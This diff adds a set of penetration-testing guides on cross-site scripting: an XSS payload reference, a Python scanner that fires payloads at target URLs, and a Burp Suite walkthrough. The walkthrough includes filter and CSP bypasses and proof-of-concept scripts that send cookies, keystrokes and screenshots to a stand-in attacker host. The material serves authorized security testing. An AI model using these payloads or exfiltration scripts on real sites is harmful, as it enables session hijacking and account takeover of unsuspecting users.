@@ -1,0 +1,1144 @@
+[PART 6/14]
+-----
+2. Deploy Content Security Policy header:
+   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+3. Set HttpOnly flag on session cookies to prevent JavaScript access
+4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
+```
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities/references/api-reference.md #####
+# API Reference: Testing for XSS Vulnerabilities
+
+## requests Library for XSS Testing
+
+### Reflection Testing
+```python
+from urllib.parse import quote
+# Inject canary to find reflection points
+resp = requests.get(f"{url}?q={canary}")
+if canary in resp.text:
+    # Input is reflected - test payloads
+    resp = requests.get(f"{url}?q={quote(payload)}")
+```
+
+## XSS Payload Categories
+| Context | Example Payload |
+|---------|----------------|
+| HTML body | `<script>alert(document.domain)</script>` |
+| HTML attribute | `" onfocus=alert(1) autofocus="` |
+| JavaScript string | `';alert(1)//` |
+| URL/href | `javascript:alert(1)` |
+| Event handler | `<img src=x onerror=alert(1)>` |
+| SVG | `<svg onload=alert(1)>` |
+| Filter bypass | `<ScRiPt>alert(1)</sCrIpT>` |
+
+## XSS Types
+| Type | Description | Persistence |
+|------|-------------|-------------|
+| Reflected | Payload in URL/request, reflected in response | Non-persistent |
+| Stored | Payload saved server-side, rendered to others | Persistent |
+| DOM-based | Payload processed by client-side JavaScript | Client-side |
+
+## CSP Analysis
+| Directive | Insecure Value | Risk |
+|-----------|---------------|------|
+| `script-src` | `'unsafe-inline'` | Allows inline `<script>` tags |
+| `script-src` | `'unsafe-eval'` | Allows `eval()` and similar |
+| `script-src` | `*.googleapis.com` | May host JSONP endpoints |
+| `base-uri` | Not set | Allows `<base>` tag injection |
+| `default-src` | `*` | Allows scripts from any origin |
+
+## Cookie Security Flags
+| Flag | Purpose |
+|------|---------|
+| `HttpOnly` | Prevents JavaScript access to cookies |
+| `Secure` | Only send over HTTPS |
+| `SameSite` | Cross-site request protection |
+
+## References
+- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
+- XSS Filter Evasion: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+- CSP Evaluator: https://csp-evaluator.withgoogle.com/
+- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Agent for testing Cross-Site Scripting (XSS) vulnerabilities during authorized assessments."""
+
+import requests
+import json
+import argparse
+import urllib3
+from datetime import datetime
+from urllib.parse import urljoin, quote
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+XSS_PAYLOADS = {
+    "html_body": [
+        '<script>alert(document.domain)</script>',
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '<details open ontoggle=alert(1)>',
+        '<body onload=alert(1)>',
+    ],
+    "html_attribute": [
+        '" onfocus=alert(1) autofocus="',
+        '" onmouseover=alert(1) "',
+        '"><script>alert(1)</script>',
+        "' onfocus=alert(1) autofocus='",
+    ],
+    "javascript_context": [
+        "';alert(1)//",
+        "\\';alert(1)//",
+        "</script><script>alert(1)</script>",
+    ],
+    "filter_bypass": [
+        '<ScRiPt>alert(1)</sCrIpT>',
+        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
+        '<svg/onload=alert(1)>',
+        '<input onfocus=alert(1) autofocus>',
+    ],
+}
+
+CANARY = "xsscanary7391"
+
+
+def detect_reflection_context(response_text, canary):
+    """Determine the rendering context of reflected input."""
+    contexts = []
+    if f">{canary}<" in response_text or f">{canary} " in response_text:
+        contexts.append("html_body")
+    if f'="{canary}"' in response_text or f"='{canary}'" in response_text:
+        contexts.append("html_attribute")
+    if f"'{canary}'" in response_text or f'"{canary}"' in response_text:
+        if "<script>" in response_text.lower():
+            contexts.append("javascript_context")
+    if f'href="{canary}' in response_text or f"href='{canary}" in response_text:
+        contexts.append("url_context")
+    return contexts if contexts else ["html_body"]
+
+
+def test_reflected_xss(base_url, params, token=None):
+    """Test URL parameters for reflected XSS."""
+    print("\n[*] Testing reflected XSS...")
+    findings = []
+    headers = {}
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+
+    for param_url in params:
+        url = urljoin(base_url, param_url)
+        canary_url = url.replace("FUZZ", CANARY)
+        try:
+            resp = requests.get(canary_url, headers=headers, timeout=10, verify=False)
+            if CANARY not in resp.text:
+                continue
+            contexts = detect_reflection_context(resp.text, CANARY)
+            print(f"  [+] Reflection found at {param_url} (contexts: {contexts})")
+            char_test_url = url.replace("FUZZ", '<>"\'&/')
+            char_resp = requests.get(char_test_url, headers=headers, timeout=10, verify=False)
+            unencoded = []
+            for ch in ['<', '>', '"', "'", '/']:
+                if ch in char_resp.text and f"&{ch}" not in char_resp.text:
+                    unencoded.append(ch)
+
+            for context in contexts:
+                payloads = XSS_PAYLOADS.get(context, XSS_PAYLOADS["html_body"])
+                for payload in payloads:
+                    test_url = url.replace("FUZZ", quote(payload))
+                    try:
+                        test_resp = requests.get(test_url, headers=headers, timeout=10, verify=False)
+                        if payload in test_resp.text or payload.lower() in test_resp.text.lower():
+                            findings.append({
+                                "type": "REFLECTED_XSS", "url": param_url,
+                                "payload": payload, "context": context,
+                                "severity": "HIGH",
+                            })
+                            print(f"  [!] XSS CONFIRMED: {param_url} | payload: {payload[:50]}")
+                            break
+                    except requests.RequestException:
+                        continue
+        except requests.RequestException:
+            continue
+    return findings
+
+
+def test_stored_xss(base_url, submit_endpoint, display_endpoint, token, field="body"):
+    """Test stored XSS via form submission."""
+    print(f"\n[*] Testing stored XSS on {submit_endpoint}...")
+    findings = []
+    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
+    submit_url = urljoin(base_url, submit_endpoint)
+    display_url = urljoin(base_url, display_endpoint)
+
+    for payload_type, payloads in XSS_PAYLOADS.items():
+        for payload in payloads[:2]:
+            marker = f"XSS-{payload_type}-{hash(payload) % 10000}"
+            tagged_payload = f"{marker}:{payload}"
+            try:
+                resp = requests.post(submit_url, headers=headers,
+                                     json={field: tagged_payload}, timeout=10, verify=False)
+                if resp.status_code in (200, 201):
+                    display_resp = requests.get(display_url, headers=headers,
+                                                timeout=10, verify=False)
+                    if payload in display_resp.text:
+                        findings.append({
+                            "type": "STORED_XSS", "submit": submit_endpoint,
+                            "display": display_endpoint, "payload": payload,
+                            "severity": "CRITICAL",
+                        })
+                        print(f"  [!] STORED XSS: {payload[:50]}")
+                        break
+            except requests.RequestException:
+                continue
+    return findings
+
+
+def check_csp_header(base_url):
+    """Analyze Content Security Policy header for XSS protection."""
+    print(f"\n[*] Checking CSP header on {base_url}...")
+    findings = []
+    try:
+        resp = requests.get(base_url, timeout=10, verify=False)
+        csp = resp.headers.get("Content-Security-Policy", "")
+        xxp = resp.headers.get("X-XSS-Protection", "")
+
+        if not csp:
+            findings.append({"type": "NO_CSP", "severity": "MEDIUM"})
+            print("  [!] No Content-Security-Policy header")
+        else:
+            print(f"  [+] CSP: {csp[:100]}...")
+            if "unsafe-inline" in csp:
+                findings.append({"type": "CSP_UNSAFE_INLINE", "severity": "HIGH"})
+                print("  [!] CSP allows 'unsafe-inline'")
+            if "unsafe-eval" in csp:
+                findings.append({"type": "CSP_UNSAFE_EVAL", "severity": "HIGH"})
+                print("  [!] CSP allows 'unsafe-eval'")
+            if "*" in csp:
+                findings.append({"type": "CSP_WILDCARD", "severity": "MEDIUM"})
+                print("  [!] CSP contains wildcard domains")
+
+        if not xxp:
+            print("  [INFO] No X-XSS-Protection header (deprecated)")
+        cookie_headers = resp.headers.get("Set-Cookie", "")
+        if cookie_headers and "httponly" not in cookie_headers.lower():
+            findings.append({"type": "COOKIE_NO_HTTPONLY", "severity": "MEDIUM"})
+            print("  [!] Session cookie missing HttpOnly flag")
+    except requests.RequestException as e:
+        print(f"  [-] Error: {e}")
+    return findings
+
+
+def generate_report(findings, output_path):
+    """Generate XSS assessment report."""
+    report = {
+        "assessment_date": datetime.now().isoformat(),
+        "total_findings": len(findings),
+        "by_type": {},
+        "findings": findings,
+    }
+    for f in findings:
+        t = f.get("type", "UNKNOWN")
+        report["by_type"][t] = report["by_type"].get(t, 0) + 1
+    with open(output_path, "w") as fh:
+        json.dump(report, fh, indent=2)
+    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")
+
+
+def main():
+    parser = argparse.ArgumentParser(description="XSS Vulnerability Testing Agent")
+    parser.add_argument("base_url", help="Base URL of the target")
+    parser.add_argument("--token", help="Bearer token for authenticated testing")
+    parser.add_argument("--params", nargs="+", default=["/search?q=FUZZ", "/page?name=FUZZ"])
+    parser.add_argument("--submit-endpoint", help="Endpoint to submit stored XSS")
+    parser.add_argument("--display-endpoint", help="Endpoint where stored input is displayed")
+    parser.add_argument("-o", "--output", default="xss_report.json")
+    args = parser.parse_args()
+
+    print(f"[*] XSS Vulnerability Assessment: {args.base_url}")
+    findings = []
+    findings.extend(check_csp_header(args.base_url))
+    findings.extend(test_reflected_xss(args.base_url, args.params, args.token))
+    if args.submit_endpoint and args.display_endpoint:
+        findings.extend(test_stored_xss(args.base_url, args.submit_endpoint,
+                                         args.display_endpoint, args.token))
+    generate_report(findings, args.output)
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities-with-burpsuite/SKILL.md #####
+---
+name: testing-for-xss-vulnerabilities-with-burpsuite
+description: Identifying and validating cross-site scripting vulnerabilities using
+  Burp Suite's scanner, intruder, and repeater tools during authorized security assessments.
+domain: cybersecurity
+subdomain: web-application-security
+tags:
+- penetration-testing
+- xss
+- burpsuite
+- owasp
+- web-security
+- cross-site-scripting
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- PR.PS-01
+- ID.RA-01
+- PR.DS-10
+- DE.CM-01
+mitre_attack:
+- T1190
+- T1059.007
+- T1505.003
+- T1083
+---
+
+# Testing for XSS Vulnerabilities with Burp Suite
+
+## When to Use
+
+- During authorized web application penetration testing to find reflected, stored, and DOM-based XSS
+- When validating XSS findings reported by automated vulnerability scanners
+- For testing the effectiveness of Content Security Policy (CSP) and XSS filters
+- When assessing client-side security of single-page applications (SPAs)
+- During bug bounty programs targeting XSS vulnerabilities
+
+## Prerequisites
+
+- **Authorization**: Written scope and rules of engagement for the target application
+- **Burp Suite Professional**: Licensed version with active scanner capabilities
+- **Browser**: Firefox or Chromium with Burp CA certificate installed
+- **FoxyProxy**: Browser extension configured to route traffic through Burp proxy (127.0.0.1:8080)
+- **Target application**: Authenticated access with valid test credentials
+- **XSS payloads list**: Custom wordlist or Burp's built-in XSS payload set
+
+## Workflow
+
+### Step 1: Configure Burp Suite and Map the Application
+
+Set up the proxy and crawl the application to discover all input vectors.
+
+```
+# Burp Suite Configuration
+1. Proxy > Options > Proxy Listeners: 127.0.0.1:8080
+2. Target > Scope: Add target domain (e.g., *.target.example.com)
+3. Dashboard > New Scan > Crawl only > Select target URL
+4. Enable "Passive scanning" in Dashboard settings
+
+# Browser Setup
+- Install Burp CA: http://burpsuite → CA Certificate
+- Import certificate into browser trust store
+- Configure proxy: 127.0.0.1:8080
+- Browse the application manually to build the site map
+```
+
+### Step 2: Identify Reflection Points with Burp Repeater
+
+Send requests to Repeater and inject unique canary strings to find where user input is reflected.
+
+```
+# In Burp Repeater, inject a unique canary string into each parameter:
+GET /search?q=xsscanary12345 HTTP/1.1
+Host: target.example.com
+
+# Check the response for reflections of the canary:
+# Search response body for "xsscanary12345"
+# Note the context: HTML body, attribute, JavaScript, URL, etc.
+
+# Test multiple injection contexts:
+# HTML body: <p>Results for: xsscanary12345</p>
+# Attribute: <input value="xsscanary12345">
+# JavaScript: var search = "xsscanary12345";
+# URL context: <a href="/page?q=xsscanary12345">
+
+# Test with HTML special characters to check encoding:
+GET /search?q=xss<>"'&/ HTTP/1.1
+Host: target.example.com
+# Check which characters are reflected unencoded
+```
+
+### Step 3: Test Reflected XSS with Context-Specific Payloads
+
+Based on the reflection context, craft targeted XSS payloads.
+
+```
+# HTML Body Context - Basic payload
+GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
+Host: target.example.com
+
+# HTML Attribute Context - Break out of attribute
+GET /search?q=" onfocus=alert(document.domain) autofocus=" HTTP/1.1
+Host: target.example.com
+
+# JavaScript String Context - Break out of string
+GET /search?q=';alert(document.domain)// HTTP/1.1
+Host: target.example.com
+
+# Event Handler Context - Use alternative events
+GET /search?q=<img src=x onerror=alert(document.domain)> HTTP/1.1
+Host: target.example.com
+
+# SVG Context
+GET /search?q=<svg onload=alert(document.domain)> HTTP/1.1
+Host: target.example.com
+
+# If angle brackets are filtered, try encoding:
+GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+Host: target.example.com
+```
+
+### Step 4: Test Stored XSS via Burp Intruder
+
+Use Burp Intruder to test stored XSS across input fields like comments, profiles, and messages.
+
+```
+# Burp Intruder Configuration:
+# 1. Right-click request > Send to Intruder
+# 2. Positions tab: Mark the injectable parameter
+# 3. Payloads tab: Load XSS payload list
+
+# Example payload list for Intruder:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+"><img src=x onerror=alert(1)>
+'-alert(1)-'
+\'-alert(1)//
+
+# In Intruder > Options > Grep - Match:
+# Add patterns: "alert(1)", "onerror=", "<script>"
+# This flags responses where payloads are reflected/stored
+```
+
+### Step 5: Test DOM-based XSS
+
+Identify client-side JavaScript that processes user input unsafely using Burp's DOM Invader.
+
+```
+# Enable DOM Invader in Burp's embedded browser:
+# 1. Open Burp's embedded Chromium browser
+# 2. Click DOM Invader extension icon > Enable
+# 3. Set canary value (e.g., "domxss")
+
+# Common DOM XSS sinks to monitor:
+# - document.write()
+# - innerHTML
+# - outerHTML
+# - eval()
+# - setTimeout() / setInterval() with string args
+# - location.href / location.assign()
+# - jQuery .html() / .append()
+
+# Common DOM XSS sources:
+# - location.hash
+# - location.search
+# - document.referrer
+# - window.name
+# - postMessage data
+
+# Test URL fragment-based DOM XSS:
+https://target.example.com/page#<img src=x onerror=alert(1)>
+
+# Test via document.referrer:
+# Create a page that links to the target with XSS in the referrer
+```
+
+### Step 6: Bypass XSS Filters and CSP
+
+When basic payloads are blocked, use advanced techniques to bypass protections.
+
+```
+# CSP Analysis - Check response headers:
+Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
+
+# Common CSP bypasses:
+# If 'unsafe-inline' is allowed:
+<script>alert(document.domain)</script>
+
+# If a CDN is whitelisted (e.g., cdnjs.cloudflare.com):
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+# Filter bypass techniques:
+# Case variation: <ScRiPt>alert(1)</ScRiPt>
+# Null bytes: <scr%00ipt>alert(1)</script>
+# Double encoding: %253Cscript%253Ealert(1)%253C/script%253E
+# HTML entities: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+# Unicode escapes: <script>\u0061lert(1)</script>
+
+# Use Burp Suite > BApp Store > Install "Hackvertor"
+# Encode payloads with Hackvertor tags:
+# <@hex_entities>alert(document.domain)<@/hex_entities>
+```
+
+### Step 7: Validate Impact and Document Findings
+
+Confirm exploitability and document the full attack chain.
+
+```
+# Proof of Concept payload that demonstrates real impact:
+# Cookie theft:
+<script>
+fetch('https://attacker-server.example.com/steal?c='+document.cookie)
+</script>
+
+# Session hijacking via XSS:
+<script>
+new Image().src='https://attacker-server.example.com/log?cookie='+document.cookie;
+</script>
+
+# Keylogger payload (demonstrates impact severity):
+<script>
+document.onkeypress=function(e){
+  fetch('https://attacker-server.example.com/keys?k='+e.key);
+}
+</script>
+
+# Screenshot capture using html2canvas (stored XSS impact):
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+<script>
+html2canvas(document.body).then(function(canvas){
+  fetch('https://attacker-server.example.com/screen',{
+    method:'POST',body:canvas.toDataURL()
+  });
+});
+</script>
+
+# Document each finding with:
+# - URL and parameter
+# - Payload used
+# - Screenshot of alert/execution
+# - Impact assessment
+# - Reproduction steps
+```
+
+## Key Concepts
+
+| Concept | Description |
+|---------|-------------|
+| **Reflected XSS** | Payload is included in the server response immediately from the current HTTP request |
+| **Stored XSS** | Payload is persisted on the server (database, file) and served to other users |
+| **DOM-based XSS** | Payload is processed entirely client-side by JavaScript without server reflection |
+| **XSS Sink** | A JavaScript function or DOM property that executes or renders untrusted input |
+| **XSS Source** | A location where attacker-controlled data enters the client-side application |
+| **CSP** | Content Security Policy header that restricts which scripts can execute on a page |
+| **Context-aware encoding** | Applying the correct encoding (HTML, JS, URL, CSS) based on output context |
+| **Mutation XSS (mXSS)** | XSS that exploits browser HTML parser inconsistencies during DOM serialization |
+
+## Tools & Systems
+
+| Tool | Purpose |
+|------|---------|
+| **Burp Suite Professional** | Primary testing platform with scanner, intruder, repeater, and DOM Invader |
+| **DOM Invader** | Burp's built-in browser extension for DOM XSS testing |
+| **Hackvertor** | Burp BApp for advanced payload encoding and transformation |
+| **XSS Hunter** | Blind XSS detection platform that captures execution evidence |
+| **Dalfox** | CLI-based XSS scanner with parameter analysis (`go install github.com/hahwul/dalfox/v2@latest`) |
+| **CSP Evaluator** | Google tool for analyzing Content Security Policy effectiveness |
+
+## Common Scenarios
+
+### Scenario 1: Search Function Reflected XSS
+A search page reflects the query parameter in the results heading without encoding. Inject `<script>alert(document.domain)</script>` in the search parameter and demonstrate cookie theft via reflected XSS.
+
+### Scenario 2: Comment System Stored XSS
+A blog comment form sanitizes `<script>` tags but allows `<img>` tags. Use `<img src=x onerror=alert(document.domain)>` to achieve stored XSS that fires for every visitor loading the page.
+
+### Scenario 3: SPA with DOM-based XSS
+A React/Angular SPA reads `window.location.hash` and injects it into the DOM via `innerHTML`. Use DOM Invader to trace the source-to-sink flow and craft a payload in the URL fragment.
+
+### Scenario 4: XSS Behind WAF with Strict CSP
+A WAF blocks common XSS patterns and CSP restricts inline scripts. Discover a JSONP endpoint on a whitelisted domain and use it as a script gadget to bypass CSP.
+
+## Output Format
+
+```
+## XSS Vulnerability Finding
+
+**Vulnerability**: Stored Cross-Site Scripting (XSS)
+**Severity**: High (CVSS 8.1)
+**Location**: POST /api/comments → `body` parameter
+**Type**: Stored XSS
+**OWASP Category**: A03:2021 - Injection
+
+### Reproduction Steps
+1. Navigate to https://target.example.com/blog/post/123
+2. Submit a comment with body: <img src=x onerror=alert(document.domain)>
+3. Reload the page; the payload executes in the browser
+
+### Impact
+- Session hijacking via cookie theft for all users viewing the page
+- Account takeover through session token exfiltration
+- Defacement of the blog post page
+- Phishing via injected login forms
+
+### CSP Status
+- No Content-Security-Policy header present
+- X-XSS-Protection header not set
+
+### Recommendation
+1. Implement context-aware output encoding (HTML entity encoding for HTML context)
+2. Deploy Content Security Policy with strict nonce-based script allowlisting
+3. Use DOMPurify library for sanitizing user-generated HTML content
+4. Set HttpOnly and Secure flags on session cookies
+5. Add X-Content-Type-Options: nosniff header
+```
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities-with-burpsuite/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
